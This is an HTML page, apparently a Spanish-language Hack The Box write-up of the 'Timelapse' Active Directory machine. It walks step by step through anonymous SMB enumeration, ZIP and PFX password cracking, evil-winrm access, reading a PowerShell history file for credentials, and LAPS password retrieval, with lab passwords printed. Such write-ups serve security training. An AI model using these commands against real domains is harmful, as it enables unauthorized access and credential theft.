@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Timelapse HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/timelapse/pasted-image-20260227002419.png" alt="Timelapse HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Timelapse</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SMB</span>
+            <span>pfx</span>
+            <span>LAPS</span>
+            <span>WinRM</span>
+            <span>fuerza_bruta_zip</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB Shares anónimo</li>
+            <li><code>Explotación</code>: <code>Fuerza bruta de ZIP</code> y <code>Fuerza bruta de PFX</code></li>
+            <li><code>Movimiento lateral</code>: <code>Historial PowerShell</code></li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>LAPS Readers</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227003207.png" alt="Timelapse HTB" />
+          <div class="code-card">
+            <h3>Enumerar SMB Shares</h3>
+            <pre><code>nxc smb dc01 -u &#x27;Guest&#x27; -p &#x27;&#x27; --shares
+smbclient -N //dc01/shares   -c &quot;recurse; prompt; mget *;&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227130111.png" alt="Timelapse HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Fuerza bruta (zip y pfx)</h2>
+          <div class="code-card">
+            <h3>Fuerza bruta de ZIP</h3>
+            <pre><code># Fuerza Bruta .zip protegido con contraseña
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
+# Contraseña: supremelegacy
+unzip winrm_backup.zip</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227130333.png" alt="Timelapse HTB" />
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227131141.png" alt="Timelapse HTB" />
+          <div class="code-card">
+            <h3>Fuerza bruta de PFX</h3>
+            <pre><code>pfx2john legacyy_dev_auth.pfx &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Contraseña: thuglegacy</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227132309.png" alt="Timelapse HTB" />
+          <div class="code-card">
+            <h3>Extraer clave privada</h3>
+            <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Extraer certificado</h3>
+            <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out priv-certificado.cert -nodes</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc01 -c certificado.cert -k priv-key.pem -S
+# -S: Puerto 5986 WINRM con SSL</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227134110.png" alt="Timelapse HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Historial PowerShell</h2>
+          <div class="code-card">
+            <h3>Historial PowerShell</h3>
+            <pre><code>cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Credenciales: svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227134725.png" alt="Timelapse HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc01  -u svc_deploy -p &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -S
+# -S: Puerto 5986 WINRM con SSL</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227134933.png" alt="Timelapse HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo LAPS Readers</h2>
+          <p><a href="https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/refs/heads/master/Get-LAPSPasswords.ps1" target="_blank" rel="noreferrer">Get-LAPSPasswords.ps1</a></p>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227135946.png" alt="Timelapse HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc01  -u administrator -p &#x27;Ffx8e}sZw6q)]&amp;4xwoYF!821&#x27; -S
+# -S: Puerto 5986 WINRM con SSL</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Buscar Flag.txt</h3>
+            <pre><code>Get-ChildItem C:\users* -Include *.txt -Recurse -ErrorAction SilentlyContinue</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/timelapse/pasted-image-20260227140327.png" alt="Timelapse HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SMB</span>
+            <span>pfx</span>
+            <span>LAPS</span>
+            <span>WinRM</span>
+            <span>fuerza_bruta_zip</span>
+            <span>zip_fuerza_bruta</span>
+            <span>zip</span>
+            <span>fuerza_bruta_pfx</span>
+            <span>pfx_fuerza_bruta</span>
+            <span>pem</span>
+            <span>cert</span>
+            <span>winrm_5986_ssl</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
